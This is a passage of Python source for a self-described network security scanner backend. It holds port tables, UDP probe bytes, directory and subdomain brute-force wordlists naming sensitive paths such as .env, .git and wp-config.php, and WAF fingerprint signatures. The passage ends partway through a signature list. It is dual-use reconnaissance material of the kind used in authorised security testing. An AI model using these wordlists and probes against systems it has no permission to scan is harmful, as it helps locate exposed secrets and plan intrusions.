#!/usr/bin/env python3
"""
ScanX - Advanced Security Scanner Backend v3.0
by iamunknown77
─────────────────────────────────────────────────
⚠  Use ONLY on systems you own or have explicit written permission to test.
   Unauthorized scanning is illegal. Use responsibly.

WebSocket Endpoints
─────────────────────────────────────────────────
  /ws/portscan   — TCP port scanner with banner grab & OS detection
  /ws/udpscan    — UDP scanner with protocol probes
  /ws/dirscan    — Directory brute-forcer with recursive & proxy support
  /ws/subdomain  — DNS subdomain enumeration
  /ws/sslcheck   — SSL/TLS certificate & cipher inspector
  /ws/headercheck— HTTP security header auditor
  /ws/dns        — DNS record lookup (A/AAAA/MX/TXT/NS/CNAME/SOA/PTR)
  /ws/ping       — TCP-based reachability probe with RTT stats
  /ws/techscan   — Technology & CMS fingerprinting
  /ws/whois      — WHOIS lookup + IP geolocation
  /ws/emailsec   — Email security audit (SPF/DMARC/DKIM/MX)
  /ws/wafdetect  — WAF/CDN/Firewall detection
  /ws/corsscan   — CORS misconfiguration scanner
  /ws/vulnscan   — Vulnerability hints based on port/service combos
  /ws/traceroute — Network path tracing (async traceroute)
"""

import asyncio
import aiohttp
import ssl
import socket
import re
import platform
import os
import time
import shutil
from datetime import datetime
from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import FileResponse

app = FastAPI(title="ScanX API", version="3.0.0")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# ── Serve frontend ────────────────────────────────────────────────────────────
@app.get("/")
async def root():
    return FileResponse("index.html")

@app.get("/favicon.svg")
async def favicon():
    return FileResponse("favicon.svg")

# ═══════════════════════════════════════════════════════════════════════════════
#  CONSTANTS & LOOKUP TABLES
# ═══════════════════════════════════════════════════════════════════════════════

PORT_SERVICES = {
    21:"FTP", 22:"SSH", 23:"Telnet", 25:"SMTP", 53:"DNS", 67:"DHCP", 69:"TFTP",
    80:"HTTP", 88:"Kerberos", 110:"POP3", 111:"RPC", 123:"NTP", 135:"MSRPC",
    137:"NetBIOS", 139:"NetBIOS", 143:"IMAP", 161:"SNMP", 179:"BGP", 389:"LDAP",
    443:"HTTPS", 445:"SMB", 465:"SMTPS", 514:"Syslog", 587:"SMTP", 631:"IPP",
    636:"LDAPS", 873:"rsync", 902:"VMware", 993:"IMAPS", 995:"POP3S", 1080:"SOCKS",
    1194:"OpenVPN", 1433:"MSSQL", 1521:"Oracle", 1723:"PPTP", 2049:"NFS",
    2082:"cPanel", 2083:"cPanel-SSL", 2222:"SSH-Alt", 2375:"Docker", 2376:"Docker-TLS",
    3000:"Node/React", 3306:"MySQL", 3389:"RDP", 3690:"SVN", 4000:"Node",
    5000:"Flask", 5432:"PostgreSQL", 5900:"VNC", 5985:"WinRM", 5986:"WinRM-TLS",
    6379:"Redis", 6443:"Kubernetes", 7001:"WebLogic", 8000:"HTTP-Dev",
    8080:"HTTP-Proxy", 8443:"HTTPS-Alt", 8888:"Jupyter", 9000:"PHP-FPM",
    9090:"Prometheus", 9200:"Elasticsearch", 9300:"Elasticsearch",
    10250:"Kubelet", 27017:"MongoDB", 27018:"MongoDB", 28017:"MongoDB-Web",
    5601:"Kibana", 3000:"Grafana/Node", 9100:"Prometheus-Node",
    11211:"Memcached", 6380:"Redis-Alt", 5000:"UPnP/Flask",
    4444:"Metasploit", 4848:"GlassFish", 7070:"WebLogic", 7443:"WebLogic-SSL",
    8161:"ActiveMQ", 61616:"ActiveMQ-MQ", 9042:"Cassandra", 7474:"Neo4j",
    5984:"CouchDB", 8086:"InfluxDB", 26379:"Redis-Sentinel",
}

TOP_100_PORTS = [
    7,9,13,21,22,23,25,26,37,53,79,80,81,88,106,110,111,113,119,135,
    139,143,144,179,199,389,427,443,444,445,465,513,514,515,543,544,548,
    554,587,631,646,873,990,993,995,1025,1026,1027,1028,1029,1110,1433,
    1720,1723,1755,1900,2000,2001,2049,2121,2717,3000,3128,3306,3389,
    3986,4899,5000,5009,5051,5060,5101,5190,5357,5432,5631,5666,5800,
    5900,6000,6001,6646,7070,8000,8008,8009,8080,8081,8443,8888,9100,
    9999,10000,32768,49152,49153,49154,49155,49156,49157
]
TOP_1000_PORTS = list(range(1, 1001))
DEFAULT_UDP_PORTS = [
    53,67,68,69,123,137,138,161,162,177,500,514,520,631,
    1194,1701,1900,4500,5353,5355,1812,1813,4789,5060
]

UDP_PROBES = {
    53:  b'\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07version\x04bind\x00\x00\x10\x00\x03',
    161: b'\x30\x26\x02\x01\x00\x04\x06public\xa0\x19\x02\x04\x00\x00\x00\x01\x02\x01\x00\x02\x01\x00\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x05\x00',
    123: b'\x1b' + b'\x00' * 47,
    5353:b'\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x01',
}

BUILTIN_WORDLIST = list(dict.fromkeys("""admin administrator login dashboard api v1 v2 v3 static assets
images css js javascript upload uploads backup backups db database config configuration
settings test tests dev development staging prod production www mail email ftp index
home user users account accounts profile profiles search auth oauth register signup
signin logout password reset forgot help support contact about blog news media download
downloads file files data logs log error errors robots.txt .htaccess .env .env.local
.git sitemap.xml wp-admin wp-login.php wp-content wp-includes phpmyadmin cpanel webmail
shell console panel manager management server system web app application portal intranet
internal private public old new bak tmp temp cache session token secret key ssl cert
security secure health status ping info version swagger api-docs graphql rest docs
documentation readme wp-json xmlrpc.php actuator metrics trace env beans heapdump
phpinfo.php info.php test.php server-status server-info crossdomain.xml
.well-known/security.txt .well-known/acme-challenge wp-cron.php wp-config.php
api/v1/users api/v2/users admin/login admin/dashboard console/login
telescope horizon nova sanctum fortify livewire filament
debug _debug trace _trace profiler _profiler""".split()))

BUILTIN_SUBDOMAINS = list(dict.fromkeys("""www mail ftp localhost webmail smtp pop imap smtps ssh sftp dev
staging test api api2 beta mobile m admin backend portal vpn remote mx mx1 mx2 ns ns1
ns2 ns3 blog shop store app apps cdn static assets media img images video files download
upload support help docs documentation wiki forum community social news careers jobs about
status monitor dashboard panel control admin2 administrator cpanel whm webdisk autodiscover
autoconfig cloud secure login auth sso oauth2 id accounts pay payment checkout cart git
gitlab jenkins ci cd build deploy uat qa sandbox demo monitoring grafana kibana prometheus
zabbix nagios mail2 webmail2 smtp2 imap2 exchange owa intranet extranet corporate lab
test2 dev2 api3 old new backup mysql ftp2 vpn2 gateway proxy
stg preprod rc staging2 prod2 internal private secure img2 api-gateway
sentry jira confluence atlassian bitbucket slack teams office""".split()))

SECURITY_HEADERS = {
    "strict-transport-security":    {"name":"HSTS",                   "risk":"HIGH",   "desc":"Missing HSTS — SSL stripping possible"},
    "content-security-policy":      {"name":"CSP",                    "risk":"HIGH",   "desc":"No CSP — XSS mitigation absent"},
    "x-frame-options":              {"name":"X-Frame-Options",        "risk":"MEDIUM", "desc":"Clickjacking protection missing"},
    "x-content-type-options":       {"name":"X-Content-Type-Options", "risk":"MEDIUM", "desc":"MIME sniffing not prevented"},
    "referrer-policy":              {"name":"Referrer-Policy",        "risk":"LOW",    "desc":"Referrer info may leak"},
    "permissions-policy":           {"name":"Permissions-Policy",     "risk":"LOW",    "desc":"Browser features unrestricted"},
    "x-xss-protection":             {"name":"X-XSS-Protection",       "risk":"LOW",    "desc":"Legacy XSS filter not configured"},
    "cross-origin-opener-policy":   {"name":"COOP",                   "risk":"MEDIUM", "desc":"Cross-origin isolation not enforced"},
    "cross-origin-embedder-policy": {"name":"COEP",                   "risk":"MEDIUM", "desc":"Cross-origin embedding unrestricted"},
    "cross-origin-resource-policy": {"name":"CORP",                   "risk":"MEDIUM", "desc":"Cross-origin resource access unrestricted"},
    "cache-control":                {"name":"Cache-Control",          "risk":"LOW",    "desc":"No cache-control — sensitive data may be cached"},
}

STATUS_LABELS = {
    200:"OK",201:"Created",204:"No Content",301:"Moved",302:"Found",
    307:"Temp Redirect",308:"Perm Redirect",400:"Bad Request",401:"Unauthorized",
    403:"Forbidden",404:"Not Found",405:"Not Allowed",406:"Not Acceptable",
    429:"Too Many",500:"Server Error",502:"Bad Gateway",503:"Unavailable",504:"Timeout",
}

# ── Technology fingerprint signatures ─────────────────────────────────────────
TECH_SIGS_HEADERS = {
    "server": [
        (r"nginx/([\d.]+)",       "Nginx",            "Web Server",   "HIGH"),
        (r"nginx",                "Nginx",            "Web Server",   "HIGH"),
        (r"apache/([\d.]+)",      "Apache",           "Web Server",   "HIGH"),
        (r"apache",               "Apache",           "Web Server",   "HIGH"),
        (r"microsoft-iis/([\d.]+)","IIS",             "Web Server",   "HIGH"),
        (r"cloudflare",           "Cloudflare",       "CDN/Proxy",    "HIGH"),
        (r"lighttpd/([\d.]+)",    "Lighttpd",         "Web Server",   "HIGH"),
        (r"openresty/([\d.]+)",   "OpenResty",        "Web Server",   "HIGH"),
        (r"caddy/([\d.]+)",       "Caddy",            "Web Server",   "HIGH"),
        (r"gunicorn/([\d.]+)",    "Gunicorn",         "App Server",   "HIGH"),
        (r"werkzeug/([\d.]+)",    "Werkzeug/Flask",   "Framework",    "HIGH"),
        (r"jetty/([\d.]+)",       "Jetty",            "App Server",   "HIGH"),
        (r"tomcat",               "Apache Tomcat",    "App Server",   "HIGH"),
        (r"kestrel",              "Kestrel/.NET",     "Web Server",   "HIGH"),
        (r"envoy",                "Envoy Proxy",      "Proxy",        "MEDIUM"),
        (r"traefik",              "Traefik",          "Proxy",        "MEDIUM"),
        (r"haproxy",              "HAProxy",          "Load Balancer","MEDIUM"),
        (r"cowboy",               "Cowboy/Erlang",    "Web Server",   "HIGH"),
        (r"uvicorn",              "Uvicorn",          "App Server",   "HIGH"),
        (r"deno",                 "Deno",             "Runtime",      "HIGH"),
        (r"bun",                  "Bun",              "Runtime",      "HIGH"),
    ],
    "x-powered-by": [
        (r"php/([\d.]+)",         "PHP",              "Language",     "HIGH"),
        (r"php",                  "PHP",              "Language",     "HIGH"),
        (r"asp\.net",             "ASP.NET",          "Framework",    "HIGH"),
        (r"express",              "Express.js",       "Framework",    "HIGH"),
        (r"next\.js",             "Next.js",          "Framework",    "HIGH"),
        (r"sails\.js",            "Sails.js",         "Framework",    "HIGH"),
        (r"django/([\d.]+)",      "Django",           "Framework",    "HIGH"),
        (r"django",               "Django",           "Framework",    "HIGH"),
        (r"laravel",              "Laravel",          "Framework",    "HIGH"),
        (r"ruby on rails",        "Ruby on Rails",    "Framework",    "HIGH"),
        (r"servlet",              "Java Servlet",     "Framework",    "MEDIUM"),
        (r"fastapi",              "FastAPI",          "Framework",    "HIGH"),
        (r"flask",                "Flask",            "Framework",    "HIGH"),
        (r"hono",                 "Hono",             "Framework",    "HIGH"),
    ],
    "x-generator": [
        (r"drupal (\d+)",         "Drupal",           "CMS",          "HIGH"),
        (r"drupal",               "Drupal",           "CMS",          "HIGH"),
        (r"joomla",               "Joomla",           "CMS",          "HIGH"),
        (r"typo3",                "TYPO3",            "CMS",          "HIGH"),
        (r"wordpress",            "WordPress",        "CMS",          "HIGH"),
        (r"ghost",                "Ghost",            "CMS",          "HIGH"),
        (r"hugo",                 "Hugo",             "SSG",          "HIGH"),
        (r"gatsby",               "Gatsby",           "SSG",          "HIGH"),
        (r"11ty|eleventy",        "Eleventy",         "SSG",          "HIGH"),
        (r"jekyll/([\d.]+)",      "Jekyll",           "SSG",          "HIGH"),
    ],
    "cf-ray":           [(r".",  "Cloudflare",        "CDN/WAF",      "HIGH")],
    "cf-cache-status":  [(r".",  "Cloudflare Cache",  "CDN",          "HIGH")],
    "x-cache": [
        (r"varnish",              "Varnish Cache",    "Cache",        "HIGH"),
        (r"cloudfront",           "AWS CloudFront",   "CDN",          "HIGH"),
        (r"hit from cloudfront",  "AWS CloudFront",   "CDN",          "HIGH"),
        (r"fastly",               "Fastly CDN",       "CDN",          "HIGH"),
    ],
    "via": [
        (r"varnish",              "Varnish",          "Cache",        "MEDIUM"),
        (r"squid",                "Squid Proxy",      "Proxy",        "MEDIUM"),
        (r"cloudfront",           "AWS CloudFront",   "CDN",          "MEDIUM"),
        (r"akamai",               "Akamai",           "CDN",          "MEDIUM"),
    ],
    "x-aspnet-version":  [(r"([\d.]+)", "ASP.NET",   "Framework",    "HIGH")],
    "x-aspnetmvc-version":[(r"([\d.]+)","ASP.NET MVC","Framework",   "HIGH")],
    "x-drupal-cache":    [(r".",  "Drupal",           "CMS",          "HIGH")],
    "x-drupal-dynamic-cache":[(r".","Drupal",         "CMS",          "HIGH")],
    "x-pingback":        [(r".",  "WordPress",        "CMS",          "HIGH")],
    "link": [
        (r"rel=\"https://api\.w\.org/\"", "WordPress","CMS",          "HIGH"),
        (r"wp-json",              "WordPress",        "CMS",          "HIGH"),
    ],
    "x-shopify-shop":    [(r".",  "Shopify",          "E-Commerce",   "HIGH")],
    "x-shopify-stage":   [(r".",  "Shopify",          "E-Commerce",   "HIGH")],
    "x-amz-request-id":  [(r".",  "AWS",              "Cloud",        "HIGH")],
    "x-amzn-requestid":  [(r".",  "AWS Lambda/APIGW", "Cloud",        "HIGH")],
    "x-amzn-trace-id":   [(r".",  "AWS X-Ray",        "Cloud",        "HIGH")],
    "x-azure-ref":       [(r".",  "Microsoft Azure",  "Cloud",        "HIGH")],
    "x-ms-request-id":   [(r".",  "Microsoft Azure",  "Cloud",        "HIGH")],
    "x-vercel-id":       [(r".",  "Vercel",           "Hosting",      "HIGH")],
    "x-vercel-cache":    [(r".",  "Vercel",           "Hosting",      "HIGH")],
    "x-netlify":         [(r".",  "Netlify",          "Hosting",      "HIGH")],
    "x-render-origin-server":[(r".","Render.com",     "Hosting",      "HIGH")],
    "x-fastly-request-id":[(r".", "Fastly CDN",       "CDN",          "HIGH")],
    "x-cache-hits":      [(r".",  "CDN Cached",       "CDN",          "MEDIUM")],
    "x-nf-request-id":   [(r".",  "Netlify",          "Hosting",      "HIGH")],
    "fly-request-id":    [(r".",  "Fly.io",           "Hosting",      "HIGH")],
    "x-railway-response":[(r".",  "Railway",          "Hosting",      "HIGH")],
    "x-heroku-":         [(r".",  "Heroku",           "Hosting",      "HIGH")],
}

TECH_SIGS_BODY = [
    # CMS
    (r"wp-content|wp-includes|/wp-json/|wp-login\.php",     "WordPress",        "CMS",                  "HIGH"),
    (r"joomla!|\/components\/com_|\/modules\/mod_",         "Joomla",           "CMS",                  "HIGH"),
    (r"/sites/default/files|drupal\.js|Drupal\.settings",   "Drupal",           "CMS",                  "HIGH"),
    (r"cdn\.shopify\.com|shopify\.com/s/|Shopify\.theme",   "Shopify",          "E-Commerce",           "HIGH"),
    (r"/skin/frontend/|Mage\.|varien/",                     "Magento",          "E-Commerce",           "HIGH"),
    (r"static\.parastorage\.com|wix\.com|_wix",             "Wix",              "Website Builder",      "HIGH"),
    (r"squarespace\.com|sqsp\.net|squarespace-cdn",         "Squarespace",      "Website Builder",      "HIGH"),
    (r"webflow\.com|webflow-badge|wf-",                     "Webflow",          "Website Builder",      "HIGH"),
    (r"ghost-(?:theme|url)|ghost\.org/blog",                "Ghost",            "CMS",                  "HIGH"),
    (r"phpbb|viewtopic\.php\?p=",                           "phpBB",            "Forum",                "HIGH"),
    (r"vbulletin|vb_postbit",                               "vBulletin",        "Forum",                "HIGH"),
    (r"discourse-cdn|discourse\.org",                       "Discourse",        "Forum",                "HIGH"),
    (r"prestashop|presta_",                                 "PrestaShop",       "E-Commerce",           "HIGH"),
    (r"opencart|catalog/view/theme/",                       "OpenCart",         "E-Commerce",           "HIGH"),
    (r"woocommerce|wc-",                                    "WooCommerce",      "E-Commerce Plugin",    "HIGH"),
    (r"concrete5|c5_|concretecms",                          "Concrete CMS",     "CMS",                  "HIGH"),
    (r"umbraco",                                            "Umbraco",          "CMS",                  "HIGH"),
    (r"kentico",                                            "Kentico",          "CMS",                  "HIGH"),
    (r"sitefinity",                                         "Sitefinity",       "CMS",                  "HIGH"),
    # JS Frameworks
    (r"__NEXT_DATA__|next/static|/_next/",                   "Next.js",          "Framework",            "HIGH"),
    (r"__NUXT__|nuxt\.js|/_nuxt/",                          "Nuxt.js",          "Framework",            "HIGH"),
    (r"__VUE__|vue(?:\.min)?\.js",                          "Vue.js",           "JS Framework",         "HIGH"),
    (r"react(?:\.production\.min)?\.js|__REACT_DEVTOOLS",   "React",            "JS Framework",         "HIGH"),
    (r"angular(?:\.min)?\.js|ng-app=|ng-version=",          "Angular",          "JS Framework",         "HIGH"),
    (r"__svelte|svelte-",                                   "Svelte",           "JS Framework",         "MEDIUM"),
    (r"__GATSBY|gatsby-",                                   "Gatsby",           "SSG",                  "HIGH"),
    (r"remix-utils|__remixContext",                         "Remix",            "Framework",            "HIGH"),
    (r"__astro|astro-",                                     "Astro",            "SSG",                  "HIGH"),
    # JS Libraries
    (r"jquery(?:\.min)?\.js|jquery-\d|jQuery\.fn\.jquery",  "jQuery",           "JS Library",           "HIGH"),
    (r"lodash(?:\.min)?\.js|_.VERSION",                     "Lodash",           "JS Library",           "MEDIUM"),
    (r"moment(?:\.min)?\.js|moment\.version",               "Moment.js",        "JS Library",           "MEDIUM"),
    (r"axios(?:\.min)?\.js",                                "Axios",            "JS Library",           "MEDIUM"),
    (r"alpinejs|x-data=|Alpine\.js",                        "Alpine.js",        "JS Framework",         "MEDIUM"),
    (r"htmx\.org|hx-get=|hx-post=",                        "htmx",             "JS Library",           "MEDIUM"),
    # CSS Frameworks
    (r"bootstrap(?:\.min)?\.(?:css|js)|bootstrap@\d",       "Bootstrap",        "CSS Framework",        "HIGH"),
    (r"tailwindcss|tailwind\.config|class=\".*?(?:flex|grid|px-\d|py-\d)",  "Tailwind CSS", "CSS Framework", "MEDIUM"),
    (r"foundation\.(?:min\.)?css|foundation/",              "Foundation",       "CSS Framework",        "MEDIUM"),
    (r"bulma(?:\.min)?\.css|bulma\.io",                     "Bulma",            "CSS Framework",        "MEDIUM"),
    (r"chakra-ui|@chakra-ui",                               "Chakra UI",        "UI Library",           "MEDIUM"),
    (r"mui\.com|@mui/material",                             "Material UI",      "UI Library",           "MEDIUM"),
    (r"antd|ant\.design|@ant-design",                       "Ant Design",       "UI Library",           "MEDIUM"),
    # Analytics / Tracking
    (r"gtag\(|googletagmanager\.com|google-analytics\.com", "Google Analytics/GTM","Analytics",          "HIGH"),
    (r"hotjar|hjid:|hjsv:",                                 "Hotjar",           "Analytics",            "HIGH"),
    (r"segment\.com|analytics\.js|cdn\.segment\.com",       "Segment",          "Analytics",            "HIGH"),
    (r"mixpanel\.com|mixpanel\.init",                       "Mixpanel",         "Analytics",            "HIGH"),
    (r"amplitude\.com|amplitude\.init",                     "Amplitude",        "Analytics",            "HIGH"),
    (r"matomo\.js|piwik\.js|_paq\.push",                    "Matomo",           "Analytics",            "HIGH"),
    (r"plausible\.io|plausible\(",                          "Plausible",        "Analytics",            "HIGH"),
    (r"posthog-js|posthog\.capture",                        "PostHog",          "Analytics",            "HIGH"),
    (r"dataLayer\.push|GTM-[A-Z0-9]",                       "Google Tag Manager","Analytics",           "HIGH"),
    (r"microsoft\.com/en-us/clarity|clarity\.ms",           "Microsoft Clarity","Analytics",            "HIGH"),
    (r"heap\.io|heap\.track",                               "Heap Analytics",   "Analytics",            "HIGH"),
    # Error Tracking
    (r"sentry\.io|Sentry\.init|__sentry",                   "Sentry",           "Error Tracking",       "HIGH"),
    (r"rollbar\.js|rollbar\.init",                          "Rollbar",          "Error Tracking",       "HIGH"),
    (r"bugsnag\.com|Bugsnag\.start",                        "Bugsnag",          "Error Tracking",       "HIGH"),
    (r"datadog-rum|datadoghq\.com/browser",                 "Datadog RUM",      "Monitoring",           "HIGH"),
    # Security / Auth
    (r"recaptcha\.net|g-recaptcha|grecaptcha",              "Google reCAPTCHA", "Security",             "HIGH"),
    (r"hcaptcha\.com|h-captcha",                            "hCaptcha",         "Security",             "HIGH"),
    (r"turnstile\.cloudflare\.com",                         "CF Turnstile",     "Security",             "HIGH"),
    (r"auth0\.com|auth0-spa-js",                            "Auth0",            "Auth",                 "HIGH"),
    (r"supabase\.io|supabase\.co",                          "Supabase",         "Backend",              "HIGH"),
    (r"firebase\.google\.com|firebaseapp\.com",             "Firebase",         "Backend",              "HIGH"),
    (r"clerk\.dev|clerk\.com",                              "Clerk",            "Auth",                 "HIGH"),
    # CDN
    (r"cloudflare\.com/ajax|/cdn-cgi/",                     "Cloudflare",       "CDN",                  "HIGH"),
    (r"cdn\.jsdelivr\.net",                                 "jsDelivr CDN",     "CDN",                  "MEDIUM"),
    (r"unpkg\.com",                                         "unpkg CDN",        "CDN",                  "MEDIUM"),
    (r"cdnjs\.cloudflare\.com",                             "cdnjs",            "CDN",                  "MEDIUM"),
    (r"s3\.amazonaws\.com|amazonaws\.com/.*\.(?:js|css)",   "AWS S3/CDN",       "Cloud",                "MEDIUM"),
    # Payment
    (r"stripe\.js|stripe\.com/v3|Stripe\(",                 "Stripe",           "Payment",              "HIGH"),
    (r"paypal\.com/sdk|paypal\.js",                         "PayPal",           "Payment",              "HIGH"),
    (r"braintreegateway\.com",                              "Braintree",        "Payment",              "HIGH"),
    (r"square\.com/payments-sdk",                           "Square",           "Payment",              "HIGH"),
    # Customer Support
    (r"intercom\.io|intercomSettings",                      "Intercom",         "Customer Support",     "HIGH"),
    (r"zendeskWidget|zendesk\.com/widget",                  "Zendesk",          "Customer Support",     "HIGH"),
    (r"drift\.com|driftt\.com",                             "Drift",            "Customer Support",     "HIGH"),
    (r"crisp\.chat|__crisp",                                "Crisp",            "Customer Support",     "HIGH"),
    (r"tawk\.to|tawkto",                                    "Tawk.to",          "Customer Support",     "HIGH"),
    # Fonts / Icons
    (r"fontawesome|font-awesome",                           "Font Awesome",     "Icon Library",         "MEDIUM"),
    (r"googleapis\.com/css.*font|fonts\.gstatic\.com",      "Google Fonts",     "CDN",                  "MEDIUM"),
    (r"fonts\.bunny\.net",                                  "Bunny Fonts",      "CDN",                  "MEDIUM"),
    # APIs
    (r"graphql",                                            "GraphQL",          "API",                  "MEDIUM"),
    (r"swagger-ui|openapi-explorer|redoc",                  "API Documentation","API Docs",             "MEDIUM"),
    (r"restframework|DRF",                                  "Django REST",      "API Framework",        "MEDIUM"),
    # Marketing
    (r"hubspot|_hsq\.|hs-scripts",                          "HubSpot",          "CRM/Marketing",        "HIGH"),
    (r"marketo|munchkin\.js",                               "Marketo",          "Marketing",            "HIGH"),
    (r"pardot\.com",                                        "Salesforce Pardot","Marketing",            "HIGH"),
    (r"mailchimp\.com|mc\.us\d+\.list-manage",              "Mailchimp",        "Email Marketing",      "HIGH"),
    # Misc Dev
    (r"vercel\.app|_vercel",                                "Vercel",           "Hosting",              "MEDIUM"),
    (r"netlify\.app|netlify\.com",                          "Netlify",          "Hosting",              "MEDIUM"),
    (r"pages\.dev|workers\.dev",                            "Cloudflare Pages", "Hosting",              "MEDIUM"),
    (r"fly\.dev|fly\.io",                                   "Fly.io",           "Hosting",              "MEDIUM"),
    (r"render\.com",                                        "Render",           "Hosting",              "MEDIUM"),
]

TECH_SIGS_COOKIES = [
    (r"wordpress_logged_in|wordpress_sec|wp-settings", "WordPress",     "CMS",          "HIGH"),
    (r"PHPSESSID",                                     "PHP",           "Language",     "HIGH"),
    (r"ASP\.NET_SessionId",                            "ASP.NET",       "Framework",    "HIGH"),
    (r"\.ASPXAUTH|\.AspNetCore",                       "ASP.NET",       "Framework",    "HIGH"),
    (r"JSESSIONID",                                    "Java/Spring",   "Framework",    "HIGH"),
    (r"laravel_session|XSRF-TOKEN",                    "Laravel",       "Framework",    "HIGH"),
    (r"django|csrftoken",                              "Django",        "Framework",    "HIGH"),
    (r"_shopify_|shopify_",                            "Shopify",       "E-Commerce",   "HIGH"),
    (r"_ga|_gid|_gclid|_gcl_au",                      "Google Analytics","Analytics",  "HIGH"),
    (r"_hjid|hjFirstSeen|hjSessionUser",               "Hotjar",        "Analytics",    "HIGH"),
    (r"__stripe_mid|__stripe_sid",                     "Stripe",        "Payment",      "HIGH"),
    (r"cf_clearance|__cf_bm|__cfruid",                 "Cloudflare",    "CDN/WAF",      "HIGH"),
    (r"incap_ses|visid_incap",                         "Imperva",       "WAF",          "HIGH"),
    (r"__utmz|__utma|__utmb",                          "Legacy Analytics","Analytics",  "MEDIUM"),
    (r"intercom-",                                     "Intercom",      "Support",      "HIGH"),
    (r"_fbp|_fbc",                                     "Facebook Pixel","Analytics",    "HIGH"),
    (r"amplitude_id|amplitude_unsent",                 "Amplitude",     "Analytics",    "HIGH"),
]

# ── WAF / CDN detection signatures ───────────────────────────────────────────
WAF_SIGS = [
    # Response headers
    {"type":"header_key", "header":"x-sucuri-id",            "name":"Sucuri WAF",           "vendor":"Sucuri",    "confidence":"HIGH"},
    {"type":"header_key", "header":"x-sucuri-cache",         "name":"Sucuri WAF",           "vendor":"Sucuri",    "confidence":"HIGH"},
    {"type":"header_key", "header":"x-fw-protect",           "name":"Firewall Protected",   "vendor":"Unknown",   "confidence":"MEDIUM"},
    {"type":"header_key", "header":"x-waf-event-info",       "name":"WAF Present",          "vendor":"Unknown",   "confidence":"HIGH"},
    {"type":"header_key", "header":"x-rejecter",             "name":"WAF Blocking",         "vendor":"Unknown",   "confidence":"MEDIUM"},
    {"type":"header_key", "header":"x-denied-reason",        "name":"WAF Blocked Request",  "vendor":"Unknown",   "confidence":"HIGH"},
    {"type":"header_key", "header":"cf-ray",                 "name":"Cloudflare WAF",       "vendor":"Cloudflare","confidence":"HIGH"},
    {"type":"header_key", "header":"cf-cache-status",        "name":"Cloudflare CDN",       "vendor":"Cloudflare","confidence":"HIGH"},
    {"type":"header_key", "header":"x-amzn-waf-action",      "name":"AWS WAF",              "vendor":"Amazon",    "confidence":"HIGH"},
    {"type":"header_key", "header":"x-azure-ref",            "name":"Azure Front Door",     "vendor":"Microsoft", "confidence":"HIGH"},
    {"type":"header_key", "header":"x-iinfo",                "name":"Incapsula/Imperva",    "vendor":"Imperva",   "confidence":"HIGH"},
    {"type":"header_key", "header":"x-cdn",                  "name":"CDN Detected",         "vendor":"CDN",       "confidence":"MEDIUM"},
    {"type":"header_key", "header":"x-varnish",              "name":"Varnish Cache",        "vendor":"Varnish",   "confidence":"HIGH"},
    {"type":"header_key", "header":"x-fastly-request-id",    "name":"Fastly CDN",           "vendor":"Fastly",    "confidence":"HIGH"},
    {"type":"header_key", "header":"x-akamai-session-info",  "name":"Akamai WAF/CDN",       "vendor":"Akamai",    "confidence":"HIGH"},
    {"type":"header_key", "header":"x-edgeconnect-midmile",  "name":"Akamai EdgeConnect",   "vendor":"Akamai",    "confidence":"HIGH"},
    {"type":"header_key", "header":"x-bd-reqid",             "name":"Baidu WAF",            "vendor":"Baidu",     "confidence":"MEDIUM"},
    {"type":"header_key", "header":"xtie-tag",               "name":"TIE WAF",              "vendor":"TIE",       "confidence":"MEDIUM"},
    # Server header value patterns
    {"type":"server_val", "pattern":r"cloudflare",           "name":"Cloudflare WAF",       "vendor":"Cloudflare","confidence":"HIGH"},
    {"type":"server_val", "pattern":r"incapsula",            "name":"Imperva Incapsula",    "vendor":"Imperva",   "confidence":"HIGH"},
    {"type":"server_val", "pattern":r"sucuri",               "name":"Sucuri WAF",           "vendor":"Sucuri",    "confidence":"HIGH"},
    {"type":"server_val", "pattern":r"barracuda",            "name":"Barracuda WAF",        "vendor":"Barracuda", "confidence":"HIGH"},
    {"type":"server_val", "pattern":r"bigip|f5\b",           "name":"F5 BIG-IP ASM",        "vendor":"F5",        "confidence":"HIGH"},
    {"type":"server_val", "pattern":r"mod_security|modsec",  "name":"ModSecurity",          "vendor":"OWASP",     "confidence":"HIGH"},
    {"type":"server_val", "pattern":r"aws-?waf",             "name":"AWS WAF",              "vendor":"Amazon",    "confidence":"HIGH"},
    {"type":"server_val", "pattern":r"akamai",               "name":"Akamai",               "vendor":"Akamai",    "confidence":"HIGH"},
    {"type":"server_val", "pattern":r"denyall|deny_all",     "name":"DenyAll rWeb WAF",     "vendor":"DenyAll",   "confidence":"HIGH"},
    {"type":"server_val", "pattern":r"juniper",              "name":"Juniper WebApp Secure","vendor":"Juniper",   "confidence":"HIGH"},
    {"type":"server_val", "pattern":r"fortress",             "name":"Fortress WAF",         "vendor":"Fortress",  "confidence":"HIGH"},
    # Cookie names
    {"type":"cookie", "cookie":"incap_ses",                  "name":"Imperva Incapsula",    "vendor":"Imperva",   "confidence":"HIGH"},
    {"type":"cookie", "cookie":"visid_incap",                "name":"Imperva Incapsula",    "vendor":"Imperva",   "confidence":"HIGH"},
    {"type":"cookie", "cookie":"cf_clearance",               "name":"Cloudflare WAF",       "vendor":"Cloudflare","confidence":"HIGH"},
    {"type":"cookie", "cookie":"__cf_bm",                    "name":"Cloudflare Bot Mgmt",  "vendor":"Cloudflare","confidence":"HIGH"},
    {"type":"cookie", "cookie":"barra_counter_session",      "name":"Barracuda WAF",        "vendor":"Barracuda", "confidence":"HIGH"},
    {"type":"cookie", "cookie":"BlockScript",                "name":"Distil Networks",      "vendor":"Distil",    "confidence":"HIGH"},
    {"type":"cookie", "cookie":"_sn",                        "name":"Citrix NetScaler",     "vendor":"Citrix",    "confidence":"MEDIUM"},
    {"type":"cookie", "cookie":"sl-session",                 "name":"SecureLink WAF",       "vendor":"SecureLink","confidence":"MEDIUM"},
    # Body signatures (blocked page patterns)
    {"type":"body_pattern", "pattern":r"sucuri website firewall",   "name":"Sucuri WAF Block",     "vendor":"Sucuri",    "confidence":"HIGH"},
    {"type":"body_pattern", "pattern":r"incapsula incident id",     "name":"Imperva Block Page",   "vendor":"Imperva",   "confidence":"HIGH"},
    {"type":"body_pattern", "pattern":r"access denied.*barracuda",  "name":"Barracuda Block",      "vendor":"Barracuda", "confidence":"HIGH"},
